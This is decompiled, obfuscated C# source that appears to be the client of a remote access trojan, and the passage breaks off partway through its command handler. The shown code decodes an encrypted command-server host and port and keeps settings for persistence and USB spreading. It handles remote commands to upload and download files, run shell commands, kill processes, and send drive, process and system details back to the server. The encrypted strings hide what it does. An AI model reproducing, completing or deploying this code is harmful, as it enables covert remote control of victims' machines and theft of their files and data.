using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;
using ns0;

namespace O;

[DesignerGenerated]
public class GForm1 : Form
{
	public delegate void ct();

	public delegate void ec();

	public delegate void gt();

	public delegate void oc();

	public delegate void rv(string data1, string data2);

	public delegate void st(string data1);

	public string NOCOP;

	public string STC;

	public string Usname;

	public string Protc;

	public string RegStr;

	public bool BD;

	public int Sleepd;

	public object LO;

	public bool SPR;

	public object F;

	public Mutex BN;

	public GClass3 cap;

	public string RT;

	public string Hideme;

	private string string_0;

	public string Star;

	public string melt;

	public string Documents;

	public string Temp1;

	public string Yy;

	public string appdata;

	private int int_0;

	public string flder;

	public string EXE;

	private GClass0 gclass0_0;

	public string SPRE;

	public string port;

	public GClass2 usb;

	public string ID;

	public string host;

	private Class19.Class22.Class23.Struct15 struct15_0;

	internal object object_0;

	internal object object_1;

	internal string string_1;

	internal RegistryKey registryKey_0;

	internal GClass1 gclass1_0;

	internal string string_2;

	internal string string_3;

	internal string string_4;

	internal IContainer icontainer_0;

	internal Timer timer_0;

	public virtual object GClass1_0
	{
		get
		{
			return gclass1_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			GClass1.ConnectedEventHandler value2 = method_2;
			GClass1.DisconnectedEventHandler value3 = method_1;
			GClass1.DataEventHandler value4 = method_0;
			GClass1 gClass = gclass1_0;
			if (gClass != null)
			{
				gClass.Event_2 -= value2;
				gClass.Event_1 -= value3;
				gClass.Event_0 -= value4;
			}
			GClass1 gClass2 = (gclass1_0 = value);
			gClass = gclass1_0;
			if (gClass != null)
			{
				gClass.Event_2 += value2;
				gClass.Event_1 += value3;
				gClass.Event_0 += value4;
			}
		}
	}

	public GForm1()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_03c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03cf: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(GForm1_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm1_FormClosing));
		GForm1.smethod_1<EventHandler, Form>((Form)(object)this, (EventHandler)method_3, 'ğ', (short)312);
		host = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0e4\uf0fd\uf0e0\uf09a\uf0e5\uf0c3\uf0e8\uf0dc\uf0e4\uf0ea\uf09d\uf0d1", 60878), 61104), 62357);
		ID = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue735\ue71c\ue71e\ue736\ue718\ue719", 61315), 59887), 57601);
		port = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf45c\uf446\uf453\uf465\uf45f\uf453\uf42f\uf42f", 60058), 62578), 60074);
		EXE = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ad\uf088\uf09d\uf096\uf091\uf08d\uf08a\uf0d0\uf09b\uf086\uf09b", 59851), 60041), 62412);
		flder = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueea7\uee83\uee89\uee98\uee85\uee99\uee85\uee8c\uee9e", 61427), 60876), 60597);
		appdata = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		Temp1 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf3e9\uf3cf\uf3c8\uf3d8", 58200), 63562), 59451);
		Documents = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		melt = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		Star = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		Hideme = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		RT = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb43\ueb43\ueb26\ueb1e\ueb1f\ueb0e\ueb13\ueb42\ueb42", 59566), 61900), 62050);
		BN = null;
		SPR = Conversions.ToBoolean(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925));
		BD = Conversions.ToBoolean(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925));
		Usname = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb83\ueb80\ueb9b", 61494), 60563), 63257);
		NOCOP = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		STC = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﱖﱳﱦﱭﱪﱶﱱ", 57851), 61257), 61991);
		Protc = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2d3\uf2f4\uf2f9\uf2e6\uf2f0", 57386), 62485), 58925);
		RegStr = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf3e9\uf3cf\uf3c8\uf3d8", 58200), 63562), 59451);
		checked
		{
			Sleepd = (int)smethod_10(Conversions.ToDouble(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue69d", 63072), 57858), 62002)) * 1000.0, '\u009f', '®');
			LO = new FileInfo(Class12.smethod_9(344, 316));
			F = (object)new Computer();
			object obj = (object_1 = Class11.smethod_9(GForm0.smethod_1(751, 702), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﺯ", 62795), 57835), 59980), GForm0.smethod_1(491, 441), 41, 127));
			cap = new GClass3();
			string text = (string_1 = (string)(IConvertible)Environment.GetEnvironmentVariable(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8a1\ue8bf\ue8b8\ue8b2\ue8bf\ue8a4", 59782), 58555), 58686), EnvironmentVariableTarget.Machine));
			string_0 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf7bb\uf7ad\uf7a4\uf7ad\uf7ab\uf7bc\uf7c8\uf7c2\uf7c8\uf7ae\uf7ba\uf7a7\uf7a5\uf7c8\uf7bf\uf781\uf786\uf7db\uf7da\uf7b7\uf7be\uf781\uf78c\uf78d\uf787\uf7ab\uf787\uf786\uf79c\uf79a\uf787\uf784\uf784\uf78d\uf79a", 62889), 61945), 62270);
			RegistryKey registryKey = (registryKey_0 = Registry.LocalMachine.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﾁﾝﾔﾆﾅﾓﾀﾗﾎﾟﾻﾱﾠﾽﾡﾽﾴﾦﾎﾅﾻﾼﾶﾽﾥﾡ\ufff2ﾜﾆﾎﾑﾧﾠﾠﾷﾼﾦﾄﾷﾠﾡﾻﾽﾼ", 63229), 63688), 61841), writable: false));
			GClass1_0 = new GClass1();
			Yy = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueaa3\uea8a\uea9e\uea9c\uea90\uea9b\uea9a\uea8d\ueaa3", 62703), 60633), 62059);
			string text2 = GClass2.DRV.smethod_9(GClass2.smethod_10(131, 'ú'), 717, 673);
			struct15_0.string_1 = text2;
			string text3 = Class3.smethod_6(struct15_0.string_1, Class5.smethod_14(struct15_0.string_1, '(', 'Ƒ', 450) + 1, struct15_0.string_1.LastIndexOf(')') - Class5.smethod_14(struct15_0.string_1, '(', 'Ǭ', 447) - 1, 813, 847);
			struct15_0.string_2 = text3;
			string string_ = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8ea\ue8d1\ue8dc\ue8d5\ue8d5\ue8e6\ue8cd\ue8cb\ue8d8\ue8c0\ue8ce\ue8d7\ue8dd", 62049), 62456), 59665);
			string string_2 = "";
			int_0 = FindWindowA(ref string_, ref string_2);
			gclass0_0 = new GClass0();
			usb = new GClass2();
			string text4 = (string_3 = (string)(IConvertible)EXE.Replace(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546), ""));
			string text5 = (string_4 = (string)(IEnumerable)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf625\uf619\uf610\uf602\uf601\uf617\uf604\uf613\uf62a\uf63b\uf61f\uf615\uf604\uf619\uf605\uf619\uf610\uf602\uf62a\uf621\uf61f\uf618\uf612\uf619\uf601\uf605\uf62a\uf635\uf603\uf604\uf604\uf613\uf618\uf602\uf620\uf613\uf604\uf605\uf61f\uf619\uf618\uf62a\uf624\uf603\uf618", 63253), 60508), 60853));
			method_10();
		}
	}

	private static void smethod_0(string string_5, string string_6)
	{
		if (!Directory.Exists(string_6))
		{
			Directory.CreateDirectory(string_6);
		}
		string[] array = (string[])(Array)Class12.smethod_10(string_5, 139, '½');
		foreach (string text in array)
		{
			string gparam_ = (string)(IEnumerable)Class3.smethod_11(string_6, Path.GetFileName(text), 781, 886);
			Class11.smethod_21(text, gparam_, 362, 'Ŝ');
		}
		string[] array2 = (string[])(Array)Class12.smethod_10(string_5, 925, 'Ϊ');
		foreach (string text2 in array2)
		{
			string string_7 = (string)(IEquatable<string>)Path.Combine(string_6, Path.GetFileName(text2));
			smethod_0(text2, string_7);
		}
	}

	public void getf(string f)
	{
		string[] array = (string[])(Array)GClass2.DRV.smethod_10(f, new char[1] { '|' }, 1010, 959);
		((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf3ca\uf3c8\uf3d9\uf3cb\uf3c4\uf3c1\uf3c8", 61603), 59253), 58436) + Yy + array[0] + Yy + Convert.ToBase64String(Class12.smethod_14(array[1], 592, 554)) + Yy + array[2]);
	}

	public void upf(string f)
	{
		string[] array = (string[])(Array)GClass2.DRV.smethod_10(f, new char[1] { '|' }, 540, 593);
		File.WriteAllBytes(GClass1.smethod_3(array[2], array[0], 419, 486), Class4.smethod_10(array[1], 589, 553));
		((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueab0\ueaba", 61507), 60817), 63236) + Yy + array[3]);
	}

	public string TnexoOos(object location)
	{
		DirectoryInfo gparam_ = new DirectoryInfo(Conversions.ToString(location));
		string text = (string)(IComparable<string>)"";
		FileInfo[] array = Class10.smethod_9(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue195\ue191\ue195", 58603), 58042), 59370), 222, 'Ú');
		foreach (FileInfo gparam_2 in array)
		{
			text = (string)(IComparable<string>)(text + GClass2.smethod_3(gparam_2, 'Ƅ', 'ǜ') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115) + smethod_19(gparam_2, 'ɑ', 604) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115) + Class14.smethod_3((int)GClass2.smethod_4(Conversions.ToString(GClass1.smethod_0(GClass1.smethod_0(location, (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), (short)231, 232), (object)GClass2.smethod_3(gparam_2, 'Ŏ', 'Ė'), (short)94, 81)), '÷', 160), '½', '¥') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee34\uee1b\uee1e\uee17\uee3f\uee13\uee1c\uee13\uee15\uee17\uee00\uee21\uee02\uee1e\uee1b\uee06", 60841), 58082), 57727));
		}
		return text;
	}

	public void och()
	{
		Class14.smethod_10<Control>((Control)(object)((Class6.Class7)Class6.Object_2).method_2(), (short)531, (short)630);
	}

	public void cc()
	{
		Class12.smethod_15<Form>((Form)(object)((Class6.Class7)Class6.Object_2).method_2(), 594, 579);
	}

	public string QRhvlBW(object location)
	{
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Expected I4, but got Unknown
		DirectoryInfo gparam_ = new DirectoryInfo(Conversions.ToString(location));
		string text = (string)(IEnumerable)"";
		DirectoryInfo[] array = (DirectoryInfo[])(Array)Class11.smethod_22(gparam_, 586, 'ȣ');
		foreach (DirectoryInfo gparam_2 in array)
		{
			text = (string)(IEnumerable)(text + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻂﻟﻶﻵ\ufefdﻼﻫﻄ", 60824), 59220), 62527) + smethod_14(gparam_2, 538, 551) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue3c1", 57842), 63450), 62912) + Class14.smethod_3((int)Class10.smethod_10(Conversions.ToString(GClass1.smethod_0(GClass1.smethod_0(location, (object)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), (short)243, 252), (object)smethod_14(gparam_2, 691, 654), (short)1007, 992)), 336, 314), '\u009f', '\u0087') + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74", 57611), 57553), 61022));
		}
		return text;
	}

	public void rvt(string data1, string data2)
	{
		RichTextBox gparam_;
		(gparam_ = ((Class6.Class7)Class6.Object_2).method_2().vmethod_3()).set_Text(GClass2.smethod_1(new string[6]
		{
			GForm0.smethod_0<RichTextBox>(gparam_, (short)746, 653),
			GForm0.smethod_1(663, 711),
			Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf77a", 60143), 63442), 59949),
			data2,
			Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue262\ue21f\ue205\ue21f", 61182), 58910), 60118),
			data1
		}, 565, 'ɝ'));
		((TextBoxBase)((Class6.Class7)Class6.Object_2).method_2().vmethod_3()).set_SelectionStart(GClass2.DRV.smethod_1(GForm0.smethod_0<RichTextBox>(((Class6.Class7)Class6.Object_2).method_2().vmethod_3(), (short)1015, 912), 859, 773));
		GClass2.smethod_9<TextBoxBase>((TextBoxBase)(object)((Class6.Class7)Class6.Object_2).method_2().vmethod_3(), 447, (short)401);
		((Form)((Class6.Class7)Class6.Object_2).method_2()).set_Text(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uee89\ueea2\ueeab\ueebe\ueea3\ueea4\ueead\ueeea\uee9d\ueea3\ueebe\ueea2\ueeea\ueef4\ueef4\ueeea", 57635), 58684), 60040) + data2);
	}

	public string gtx()
	{
		string gparam_ = GForm0.smethod_1(52, 103);
		((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued0d\ued1a\ued1c\ued09\ued1c\ued13\ued16", 61257), 63399), 62774), Yy, gparam_, 42, 124));
		return Conversions.ToString(true);
	}

	public string nYekikJU()
	{
		string text = (string)(IEnumerable<char>)"";
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue93a\ue915\ue910\ue919\ue92f\ue905\ue90f\ue908\ue919\ue911", 59545), 58168), 57868), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufafd頋𢡄𢡊\ufadc響", 63017), 63547), 62715), new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				DriveInfo driveInfo = (DriveInfo)enumerator.Current;
				switch (driveInfo.DriveType)
				{
				case DriveType.Removable:
					if (Conversions.ToBoolean(Class12.smethod_16(Class14.smethod_11(driveInfo, 211, '\u0081').get_Exists(), 469, 405)))
					{
						text = (string)(IEnumerable<char>)GClass2.smethod_1(new string[7]
						{
							text,
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb93\ueb9a\uebad\ueba5\ueba7\uebbe\uebad\ueb95", 57807), 60524), 59017),
							GClass2.DRV.smethod_6(driveInfo, 'a', '\u0016'),
							Class4.smethod_11(driveInfo, 86, 78),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							Conversions.ToString(driveInfo.TotalSize),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74", 57611), 57553), 61022)
						}, 262, 'Ů');
					}
					break;
				case DriveType.Fixed:
					if (Conversions.ToBoolean(Class12.smethod_16(Class14.smethod_11(driveInfo, 599, 'ȅ').get_Exists(), 697, 761)))
					{
						text = (string)(IEnumerable<char>)GClass2.smethod_1(new string[7]
						{
							text,
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue882\ue89d\ue8ab\ue8b0\ue8af\ue8bc\ue884", 60394), 58978), 58829),
							GClass2.DRV.smethod_6(driveInfo, 'ʼ', 'ˋ'),
							Class4.smethod_11(driveInfo, 486, 510),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							Conversions.ToString(driveInfo.TotalSize),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74", 57611), 57553), 61022)
						}, 863, '\u0337');
					}
					break;
				case DriveType.Network:
					if (Conversions.ToBoolean(Class12.smethod_16(Class14.smethod_11(driveInfo, 878, '\u033c').get_Exists(), 246, 182)))
					{
						text = (string)(IEnumerable<char>)GClass2.smethod_1(new string[7]
						{
							text,
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf284\uf291\uf2ba\uf2ab\uf282", 61389), 61428), 62141),
							GClass2.DRV.smethod_6(driveInfo, 'A', '6'),
							Class4.smethod_11(driveInfo, 1017, 993),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							Conversions.ToString(driveInfo.TotalSize),
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74", 57611), 57553), 61022)
						}, 910, 'Ϧ');
					}
					break;
				case DriveType.CDRom:
					if (Conversions.ToBoolean(Conversions.ToString(driveInfo.RootDirectory.get_Exists())))
					{
						text = (string)(IEnumerable<char>)(text + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueaee\ueaf6\ueaf1\ueae8", 59163), 58833), 59460) + driveInfo.Name + driveInfo.VolumeLabel + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115) + Conversions.ToString(driveInfo.TotalSize) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74\uef46\uef69\uef6c\uef65\uef4d\uef61\uef6e\uef61\uef67\uef65\uef72\uef53\uef70\uef6c\uef69\uef74", 57611), 57553), 61022));
					}
					break;
				}
			}
			return text;
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public object stx(string str)
	{
		GForm0.smethod_3(str, 213, 247);
		return true;
	}

	public object ctx()
	{
		Class3.smethod_12(578, 601);
		return true;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_0(byte[] byte_0)
	{
		//IL_2182: Unknown result type (might be due to invalid IL or missing references)
		//IL_2188: Invalid comparison between Unknown and I4
		//IL_3c94: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c99: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_48b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_48ba: Invalid comparison between Unknown and I4
		string[] array = (string[])(Array)GClass2.DRV.smethod_7(Class2.smethod_8(ref byte_0), Yy, -1, (CompareMethod)0, 'í', 'ç');
		checked
		{
			try
			{
				string gparam_ = array[0];
				switch (Class11.smethod_0(gparam_))
				{
				case 182978943u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue7ad\ue78a\ue79f\ue78c\ue78a", 59565), 63528), 63472), bool_0: false, '\u02f2', 'ˊ') == 0)
					{
						dkGrWJGkB(array[1]);
					}
					break;
				case 118989100u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue46e\ue461\ue462\ue47e\ue468\ue46e\ue469", 60497), 59551), 57511), bool_0: false, 'ċ', 'ĳ') == 0)
					{
						try
						{
							string lpReturnString = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf62a\uf63c\uf62d\uf679\uf63a\uf63d\uf638\uf62c\uf63d\uf630\uf636\uf679\uf63d\uf636\uf636\uf62b\uf679\uf63a\uf635\uf636\uf62a\uf63c\uf63d", 60414), 61017), 62439);
							string lpCommandString = Class14.smethod_3(0, '\u008b', '\u0093');
							mciSendStringA(ref lpReturnString, ref lpCommandString, 0L, 0L);
							break;
						}
						catch (Exception gparam_17)
						{
							smethod_6(gparam_17, 'ˌ', 747);
							Class5.smethod_4('Ɂ', 564);
							break;
						}
					}
					break;
				case 274332258u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufff6￭\ufff0\ufff1￡￪\ufff2￫￦￪￨\ufff5\ufff0\ufff1￠\ufff7", 62135), 60869), 57473), bool_0: false, 'Ρ', 'Ι') == 0)
					{
						Interaction.Shell(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf686\uf69d\uf680\uf681\uf691\uf69a\uf682\uf69b\uf6d5\uf6d8\uf686\uf6d5\uf6d8\uf681\uf6d5\uf6c5\uf6c5", 63516), 61421), 57699), (AppWinStyle)0, false, -1);
					}
					break;
				case 271632497u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufb0eﬁﬄיִ\ufb1e\ufb1e", 60083), 58981), 63487), bool_0: false, 'ά', 'Δ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufb0eﬁﬄיִ\ufb1e\ufb1e", 60083), 58981), 63487) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 263456517u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8b2\uf8b5\uf8bd\uf8b4", 63360), 63434), 63675), bool_0: false, 'φ', 'Ͼ') == 0)
					{
						string text11 = (string)(IComparable)GForm0.smethod_1(936, 1018);
						string text12 = (string)(IComparable)GForm0.smethod_1(772, 853);
						string text13 = Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class4.smethod_6(Class10.smethod_6<ComputerInfo>(((ServerComputer)Class6.Object_3).get_Info(), (short)66, '\u0002'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueea7\uee83\uee89\uee98\uee85\uee99\uee85\uee8c\uee9e", 61427), 60876), 60597), "", 915, 'ϫ'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue108\ue136\ue131\ue13b\ue130\ue128\ue12c", 61932), 62874), 58642), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻸﻆﻁ", 58988), 63517), 57564), 279, 'ů'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec20", 62915), 61164), 63262), "", 642, '\u02fa'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("푘", 62187), 62846), 62062), "", 173, 'Õ'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf77a\uf77a", 57839), 58646), 62379), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue2d2", 57611), 58650), 58915), 754, 'ʊ'), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf795\uf7e2\uf7dc\uf7db", 61337), 62167), 60117), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﻸﻆﻁ", 58988), 63517), 57564), 354, 'Ě');
						((GClass1)GClass1_0).Send(GClass2.smethod_1(new string[20]
						{
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf8b2\uf8b5\uf8bd\uf8b4", 63360), 63434), 63675),
							Yy,
							ID,
							Yy,
							text11,
							Yy,
							struct15_0.string_2,
							Yy,
							text13,
							Class2.smethod_1(),
							Yy,
							text12,
							Yy,
							Class2.smethod_4(),
							Yy,
							Class2.smethod_2(),
							Yy,
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﶵ\ufde3ﷰ\ufdedﷰ\ufde3ﶉ", 62234), 59559), 58938),
							Yy,
							Class2.smethod_3()
						}, 125, '\u0015'));
					}
					break;
				case 328129470u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("﷽\ufdff\ufdee\ufdfe\ufdff\ufde9ﷱ\ufdeeﷵ\ufdea\ufdeaﷻ\ufdeeﷲ", 61362), 59319), 62746), bool_0: false, 'd', '\\') == 0)
					{
						string gparam_18 = (string)(IConvertible)GClass2.smethod_0(Environment.SpecialFolder.Desktop, 'ȋ', 597);
						((GClass1)GClass1_0).Send(Class4.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufbb6\ufbb4ﮥﮡﮰﮥ\ufbb9", 61715), 62181), 63673), Yy, gparam_18, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 733, 644));
					}
					break;
				case 287005647u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued00\ued03\ued21\ued3c\ued30\ued36\ued20\ued20", 57946), 58999), 59755), bool_0: false, 'ǀ', 'Ǹ') == 0)
					{
						string[] array12 = (string[])(Array)GClass2.DRV.smethod_10(array[1], new char[1] { 'P' }, 96, 45);
						int num2 = array12.Length - 2;
						for (int m = 0; m <= num2; m++)
						{
							Process[] processesByName2 = Process.GetProcessesByName(array12[m]);
							method_8(processesByName2[0]);
						}
					}
					break;
				case 547083341u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueebd\uee8c\uee91\uee9d\ueebd\uee86\ueeba\uee99\uee8c\uee8c\uee8a\uee81", 60337), 61601), 62971), bool_0: false, '\u032e', '\u0316') == 0)
					{
						object obj6 = smethod_18(GClass2.smethod_5(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf09c\uf08e\uf09f\uf086\uf0e1\uf09c\uf0bf\uf0b9\uf0a0\uf0a6\uf0ac\uf0aa", 62894), 62374), 63196), "", 622, 561), 231, 184);
						string text6 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea85\uea86\uea93\uea97\uea9d", 61894), 59849), 62189);
						object[] array10 = new object[1];
						ref string reference7 = ref array[1];
						ref string reference4 = ref reference7;
						array10[0] = reference7;
						object[] array5 = array10;
						bool[] obj7 = new bool[1] { true };
						bool[] array6 = obj7;
						NewLateBinding.LateCall(obj6, (Type)null, text6, array10, (string[])null, (Type[])null, obj7, true);
						if (array6[0])
						{
							reference4 = (string)Class10.smethod_7(smethod_18(array5[0], 662, 713), typeof(string), 783, 857);
						}
					}
					break;
				case 458150816u:
				{
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb24\ueb06\ueb17\ueb33\ueb11\ueb0c\ueb00\ueb06\ueb10\ueb10\ueb06\ueb10", 59617), 61857), 62028), bool_0: false, 'κ', '\u0382') != 0)
					{
						break;
					}
					string text = (string)(IEnumerable<char>)"";
					string text2 = (string)(ICloneable)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮝ\ufbbfﮢﮮﮨ\ufbbe\ufbbeﮞ\ufbbdﮡﮤ\ufbb9", 57822), 63468), 60861);
					Process[] array2 = (Process[])(Array)smethod_21(869, 799);
					foreach (Process gparam_7 in array2)
					{
						try
						{
							text = (string)(IEnumerable<char>)GClass2.smethod_1(new string[11]
							{
								text,
								Class5.smethod_3(gparam_7, 535, 529),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
